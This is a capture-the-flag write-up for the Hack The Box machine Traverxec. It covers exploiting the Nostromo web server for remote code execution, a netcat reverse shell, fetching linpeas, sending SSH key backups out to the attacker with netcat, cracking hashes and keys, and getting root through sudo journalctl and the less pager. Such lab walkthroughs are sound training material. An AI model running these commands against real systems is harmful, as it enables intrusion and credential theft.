# Overview

Traverxec is an easy linux box that features a Nostromo Web Server, which is vulnerable to Remote Code Execution (RCE). The Web server configuration files lead us to SSH credentials, which allow us to move laterally to the user `david`. A bash script in the user's home directory reveals that the user can execute `journalctl` as root, which is exploited to spawn a `root` shell!

---

# Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.165 | grep ^[0-9] | cut -d '/' -f
1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.10.165
```

![Initial NMAP](/images/traverxec/nmap.png)

Once the scan completes, it reveals ports 22 and 80 are open. NMAP also reports that the `http-server-header` is `nostromo 1.9.6`, which indicates the box is running the `Nostromo` HTTP server.

# Nostromo

![Nostromo](/images/traverxec/nostromo.png)

The webpage appears to be pretty empty, resulting in very little information at first look. So, we fire off a gobuster:

```bash
gobuster dir -u http://10.10.10.165 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -n
```

While we let gobuster run in the background, I look to Google. After a bit of digging, we find that Nostromo version 1.9.6 has a <a href="https://www.exploit-db.com/exploits/47837">Remote Code Execution</a> vulnerability. Being that this exploit is found on Exploit-DB, that usually means there is a Metasploit module for it - which means we can "manually" exploit it or use Metasploit. I'll show both ways.

---
# "Manual" exploitation

First, we need to copy the exploit from exploit-db and inspect it:

```bash
searchsploit -m /multiple/remote/47837
```


![Exploit](/images/traverxec/payload.png)

**The heck is going on?**

Interesting. We're exploiting the `http_verify` function in nostromo nhttpd. Which is allowing us remote code execution. Let's test it out:

```bash
python 47837.py 10.10.10.165 80 id
```
![Response](/images/traverxec/id.png)

Ok, cool, we got a response. Lets setup a listener and try to get a shell:

```bash
nc -lvnp 9001
```

```bash
python 47837.py "nc -e bash 10.10.10.165 9001"
```

And........ We get a shell

---
# Metasploit

Now that we've manually exploited Nostromo, let's automate it with `Metasploit`.

```bash
msfconsole
msf > use exploit/multi/htto/nostromo_code_exec
msf > set rhost 10.10.10.165
msf > set lhost 10.10.14.40
msf > run
```
> *Make sure you set lhost to YOUR machines IP.*

![Metasploit](/images/traverxec/metasploit.png)

After we fire off the exploit, we get a shell:

![Metasploit-Shell](/images/traverxec/meta-shell.png)

---
# Stabelize Shell
Let's move forward with our manual shell. But first, we need to stabelize it. I don't know about you, but I can't live without TAB auto-cmplete!

The target machine is Linux, so it *SHOULD* have `Python` installed, but lets check anyway.
```bash
which python
/usr/bin/python
```
*Let's spawn a TTY shell!* 
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z (to background)
stty raw -echo
fg [enter] (to send to foreground)
```
We should now have a stable shell!

---
# Automated Target Enumeration

I think it's important to always have some sort of enumeration running while we're working. So, one of the first things I do on a box is to get some sort of automated enuermation running. For Linux, I like to use `Linpeas`. There's a couple of ways we can get this onto the box, but normally I'll just `wget` it from my kali box.

*On Attacker Machine, in the Linpeas directory*
```bash
python -m SimpleHTTPServer
```

*On Target Machine*
```bash
cd /tmp/
wget 10.10.14.10:8000/linpeas.sh
```
![Linpeas](/images/traverxec/linpeas-wget.png)

Now that we have Linpeas, we use `chmod +x` to make it an executable and then `./linpeas.sh` to run it.

![Linpeas](/images/traverxec/linpeas.png)

---
# Manual Target Enumeration

We have linpeas running, so now we can start manually enumerating the box. We check `/etc/passwd` and find the user `David` exists. It also shows us the web root for nostromo is `/var/nostromo/`. The `/var/nostromo/conf` directory, which contains the `.htpasswd` which leaks a crackable hash. We also find the file `nhttpd.conf` which reveals some interesting information. The file has a section called `HOMEDIRS` and hints towards `public_www` folders in a user's home directory.

```bash
ls -la /home/david/public_www/
ls -la /home/david/public_www/protected-file-area/
```

![Protected-Area](/images/traverxec/enum-protected.png)

**BINGO!** We find `backup-ssh-identity-files.tgz`. Let's exfiltrate it!

*On Attacker Machine*
```bash
nc -lvp 1234 > backup-ssh-identity-files.tgz
```

*On Target Machine*
```bash
nc 10.10.14.40 < /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
```
Let's extract the files. 
```bash
tar -xvf backup-ssh-identity-files.tgz
```
The archive contains SSH keys, one of them being the private key `id_rsa`.

*Before we continue, lets check in on Linpeas*

![Linpeas-Hash](/images/traverxec/linpeas-hash.png)

Looks like it found the same hash we did. Time to crack it!

---
###### Disclaimer!

> This is a small rabbit-hole, but not entirely useless. If you didn't find the protected-file-area in David's home directory, this was another way to get the same end result.

In order to crack the hash, we need to identify waht type of hash it is. By inspecting the hash, we see it starts with `$1$` - this means its an `MD5 hash`. Now, we can just throw the hash into a file and run it through `Hashcat`.

```bash
vi hash
(copy and paste hash)
:wq
```

```bash
hashcat -m 500 -a 0 --force hash /usr/share/wordlists/rockyou.txt
```
> `-m` flag is used to set the mode. `500` is to set the mode to `MD5`.

![Hashcat-Usage](/images/traverxec/hashcat1.png)

After a little while, we successfully crack the hash!

![Hashcat-Usage](/images/traverxec/hashcat2.png)

Great, now we have the password for David. We can try to `ssh` into David's account and hope that the password is the same, but I'll save you the trouble - it isn't.

**So where do we use this password?**
Had we enumerated more onto the website, or taken the information from David's home directory, `~/David/public_www/protected-file-area` and checked the website - we would find that we are prompted with a login at `10.10.10.165/~david/protected-file-area/`.

![Protected-file-area](/images/traverxec/david-login.png)

We use `david`:`Nowonly4me` and get in! We find the same file as we did on the box.

![David-Webdir](/images/traverxec/david-webdir.png)

# SSH Key Cracking
Now that we've stumbled upon the private key for David, lets crack it. In order to crack it, we need to follow these steps:

1. Use ssh2john to convert the private key into a hash file that <a href="https://github.com/openwall/john">John the Ripper</a> can use. 
2. Use John the Ripper and a password file, like `rockyou.txt` to crack the hash. 

```bash
/opt/JohnTheRipper/run/ssh2john.py id_rsa > davidHash
```
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt davidHash
```
![JTR-Crack](/images/traverxec/ssh-cracked.png)

We use the newly cracked private key and the credentials `david`:`hunter` to `ssh` into the box and get the user flag.

```bash
ssh -i id_rsa david@10.10.10.165
```
![Getting-User](/images/traverxec/getting-user.png)

*[HACKER VOICE]* I'm in.

---
# Privilege Escalation
David's home directory has an interesting `bin` folder, which contains a file `server-stats.sh`.

```bash
cat server-stats.sh
```
![Server-Stats](/images/traverxec/server-stats.png)

The last line is interesting because it's executing `journalctl` as sudo.

```bash
./server-stats.sh
```
Well, as we might have expected, the script is returning the last 5 lines of the nostromo service logs using journalctl. 

Let's review the `manual page` of journalctl:
![man-journalctl](/images/traverxec/man-journalctl.png)

*Interesting* the man page says journalctl uses the <a href="https://gtfobins.github.io/gtfobins/less/">less</a> binary to display its' output, and that long lines are "truncated" to screen width.

Ok, cool. We know from <a href="https://gtfobins.github.io/gtfobins/">GTFOBins</a> that we can get a shell from using less. We also know that this shell will be running as root, because when we can execute journalctl with sudo. Let's give it a shot.

```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```
> This command is from the last line in `server-stats.sh`.

![fail](/images/traverxec/fail.png)

**Did it work?**

This exploit is tricky. This will not work initially if you have your terminal at full screen. Why? Because, if you recall, the output is "truncated for long lines". Our terminal is full screen, and less doesn't need to truncate full lines. This means the `server-stats.sh` script can run it's entire command without being interrupted. 

**What if we *shrink* our terminal and run the script again?**

```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
!/bin/bash [enter]
```
![Gett-Root](/images/traverxec/root.png)

# We got ROOT!

Why did that work? It worked because less truncated the output and waited for user input to either continue or exit. We exploited that to spawn a root shell.

# Final Thoughts

This was an easy box, however, the intial foothold for user definately required you to think outside the box. However, I think it's a good reminder that spending quality time `enumerating` will always pay off.
